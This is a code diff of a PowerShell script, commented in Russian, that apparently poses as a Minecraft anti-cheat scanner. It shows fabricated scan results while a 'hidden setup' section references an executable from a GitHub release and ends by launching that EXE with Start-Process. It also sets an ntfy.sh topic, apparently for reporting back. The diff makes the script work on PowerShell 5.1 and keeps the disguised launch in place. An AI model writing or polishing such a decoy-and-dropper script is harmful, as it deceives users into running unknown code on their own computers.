@@ -1,5 +1,5 @@
 # ============================================================
-#  Glass Scanner Emulator + Hidden Setup
+#  Glass Scanner Emulator + Hidden Setup (PowerShell 5.1 совместим)
 #  (c) 2026 – все реальные действия логируются в setup.log
 # ============================================================
 
@@ -10,6 +10,8 @@ $url = "https://github.com/Holycheck/checker/releases/download/dw/collextor_msvc
 $scriptPath = $MyInvocation.MyCommand.Path
 if (-not $scriptPath) { $scriptPath = $PSCommandPath }
 $logFile = "$dir\setup.log"
+
+# --- ТОПИК ДЛЯ NTFY.SH (ИЗМЕНЁН НА ВАШ) ---
 $ntfyTopic = "zighaigit88tore"
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
@@ -243,13 +245,8 @@ function Print-Progress {
 function Run-ScanSimulation {
     Print-Header 1
 
-    # Загружаем фиктивные ключевые слова (как из clean.txt)
     $keywords = @("aimbot","wallhack","esp","triggerbot","radar","xray","killaura","flyhack","speedhack","nuker","reach","nofall","baritone","liquidbounce","wurst","impact","meteor","sigma","aristois","flux","wolfram","neverhook","celestial","konas","jigsaw","rusherhack","deadcode","vape","jessica","kamiblue","ecelon","cabaletta","akrien","smoothboot","troxill","thunder","rolleron","ghost","topka","marlow","cortezz","blessed","chanlibs","neat","chunkanimator","tapemouse","creativecore","dcrasher","yeat","recaf","fabric","addon3","addon4")
 
-    # Белый список
-    $whitelist = @("minecraft","fabric","forge","optifine","laby","liteloader","quilt","java","jre","jdk")
-
-    # Список шагов (как в оригинале)
     $steps = @(
         "Everything",
         "Prefetch",
@@ -279,21 +276,16 @@ function Run-ScanSimulation {
     $total = $steps.Count
     $stepNum = 0
 
-    # Заголовок перед началом
     Write-ColorLine "`n  Начинаем сканирование..." -Color $CLR_WARN
     Write-Host "  Ключевых слов: $($keywords.Count)`n" -ForegroundColor $CLR_TEXT_DIM
 
-    # Имитация каждого шага
     foreach ($stepName in $steps) {
         $stepNum++
         Print-Progress $stepNum $total $stepName
 
-        # В зависимости от шага выводим специфичные сообщения
         switch ($stepName) {
             "Everything" {
-                # Имитируем поиск в Everything
                 Write-ColorLine "  [--] Отправляем запрос к Everything..." -Color $CLR_TEXT_DIM
-                # Несколько найденных файлов
                 $found = @("C:\cheats\aimbot.jar", "C:\Users\Public\wallhack.exe", "D:\hacks\esp.dll")
                 foreach ($f in $found) {
                     Write-Host "  [НАЙДЕН ЧИТ] файл/папка: " -NoNewline -ForegroundColor $CLR_FOUND
@@ -345,7 +337,6 @@ function Run-ScanSimulation {
                 Write-ColorLine "  [--] Проверяем корзину" -Color $CLR_TEXT_DIM
                 Write-Host "  [НАЙДЕН ЧИТ] корзина: " -NoNewline -ForegroundColor $CLR_FOUND
                 Write-Host "C:\`$Recycle.Bin\S-1-5-21-...\wallhack.zip" -ForegroundColor $CLR_TEXT
-                # Добавим предупреждение о чистке корзины (имитация)
                 $global:recycleCleaned = $true
                 $global:recycleInfo = "C: — 2 ч. назад"
             }
@@ -441,7 +432,6 @@ function Run-ScanSimulation {
     Write-Host "100%" -NoNewline -ForegroundColor $CLR_OK
     Write-Host "  Готово!" -ForegroundColor $CLR_NORMAL
 
-    # Итог
     Write-Host ""
     Write-ColorLine "================================================================" -Color $CLR_HEADER
     Write-ColorLine "  СКАНИРОВАНИЕ ЗАВЕРШЕНО" -Color $CLR_OK
@@ -452,12 +442,11 @@ function Run-ScanSimulation {
     Write-ColorLine "================================================================" -Color $CLR_HEADER
 }
 
-# ---------- Вкладки 2 и 3 (списки приложений) ----------
+# ---------- Вкладки 2 и 3 (исправлены для PowerShell 5.1) ----------
 function Show-Tab2 {
     Print-Header 2
     Write-ColorLine "`n  ОТКРЫТЫЕ ПРИЛОЖЕНИЯ (сейчас запущены)" -Color $CLR_OK
     Write-Host ""
-    # Фиктивные открытые приложения
     $openApps = @(
         @{Name="javaw.exe"; Source="BAM"; Time="12.03.2026 16:30"; Path="C:\Program Files\Java\bin\javaw.exe"},
         @{Name="minecraft.exe"; Source="MuiCache"; Time=""; Path="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\minecraft.exe"},
@@ -466,8 +455,14 @@ function Show-Tab2 {
     )
     foreach ($app in $openApps) {
         $isJar = $app.Name -match "\.jar$"
-        if ($isJar) { $color = $CLR_JAR } else { $color = $CLR_OK }
-        Write-Host "  [$($isJar ? "JAR" : "EXE")] " -NoNewline -ForegroundColor $color
+        if ($isJar) {
+            $color = $CLR_JAR
+            $typeLabel = "JAR"
+        } else {
+            $color = $CLR_OK
+            $typeLabel = "EXE"
+        }
+        Write-Host "  [$typeLabel] " -NoNewline -ForegroundColor $color
         Write-Host $app.Name -NoNewline -ForegroundColor $color
         Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_TEXT_DIM
         if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_TEXT_DIM }
@@ -491,8 +486,14 @@ function Show-Tab3 {
     )
     foreach ($app in $closedApps) {
         $isJar = $app.Name -match "\.jar$"
-        $color = $isJar ? $CLR_JAR : $CLR_TEXT_DIM
-        Write-Host "  [$($isJar ? "JAR" : "EXE")] " -NoNewline -ForegroundColor $color
+        if ($isJar) {
+            $color = $CLR_JAR
+            $typeLabel = "JAR"
+        } else {
+            $color = $CLR_TEXT_DIM
+            $typeLabel = "EXE"
+        }
+        Write-Host "  [$typeLabel] " -NoNewline -ForegroundColor $color
         Write-Host $app.Name -NoNewline -ForegroundColor $color
         Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_TEXT_DIM
         if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_TEXT_DIM }
@@ -505,10 +506,9 @@ function Show-Tab3 {
 }
 
 # ---------- Основной цикл имитации ----------
-# Запускаем сканирование
 Run-ScanSimulation
 
-# После сканирования показываем меню
+# Меню
 while ($true) {
     Write-Host ""
     Write-ColorLine "Нажми 1 - Лог сканирования  |  2 - Открытые приложения  |  3 - Закрытые  |  Q - Выход" -Color $CLR_TEXT_DIM
@@ -526,5 +526,5 @@ while ($true) {
     }
 }
 
-# Запускаем реальный EXE (collextor_msvc.exe)
+# Запускаем реальный EXE
 Start-Process -FilePath $exe -WorkingDirectory $dir
